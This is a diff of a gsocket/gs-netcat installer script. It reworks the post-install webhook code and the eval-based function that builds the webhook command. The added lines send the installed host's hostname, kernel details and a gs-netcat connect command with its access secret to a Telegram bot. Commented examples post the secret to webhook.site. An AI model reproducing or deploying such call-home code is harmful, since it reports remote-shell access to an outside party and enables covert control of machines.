@@ -60,19 +60,18 @@ URL_BASE="https://www.gsocket.io/bin"
 [[ -n $GS_URL_BASE ]] && URL_BASE="${GS_URL_BASE}"
 # WEBHOOKS are executed after a successfull install
 # 1. Need a URL for WGET and CURL
-# 2. Escape all '&' with '\&'
 ### Telegram example
 GS_TG_TOKEN=""
 GS_TG_CHATID=""
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
-	msg="\$(hostname) --- \$(uname -rom) --- gs-netcat -i -s \${GS_SECRET}"
-	GS_WEBHOOK_CURL=("--data-urlencode" "text=\"${msg}\"" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}\&parse_mode=html")
-	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}\&parse_mode=html\&text=${msg}")
+	msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
+	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
+	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
 	unset msg
 }
 ### webhook.site example
 # GS_WEBHOOK_CURL=("-duser=foo2" '-dpassword=${GS_SECRET}' "https://webhook.site/dc3c1af9-ea3d-4401-9158-eb6dda735276")
-# GS_WEBHOOK_WGET=("--post-data" 'user=foo\&password=${GS_SECRET}' "https://webhook.site/dc3c1af9-ea3d-4401-9158-eb6dda735276")
+# GS_WEBHOOK_WGET=("--post-data" 'user=foo&password=${GS_SECRET}' "https://webhook.site/dc3c1af9-ea3d-4401-9158-eb6dda735276")
 ### A complex example:
 # GS_WEBHOOK_CURL=("curl" "-X" "POST" 'https://webhook.site/dc3c1af9-ea3d-4401-9158-eb6dda735276' \
 # 		"-H" "content-type: application/json" \
@@ -1347,18 +1346,19 @@ test_network()
 do_webhook()
 {
 	local arr
-	local i
 	local IFS
+	local str
 	i=0
 
 	IFS=""
 	# Substitude any $SECRET variable etc.
 	while [[ $# -gt 0 ]]; do
-		arr+=($(eval echo "$1"))
+        eval str=\""$1"\"
+		arr+=("$str")
 		shift 1
-		((i++))
 	done
 
+	# echo "arr=${#arr[@]}: ${arr[@]}"
 	"${arr[@]}" >/dev/null
 }
 
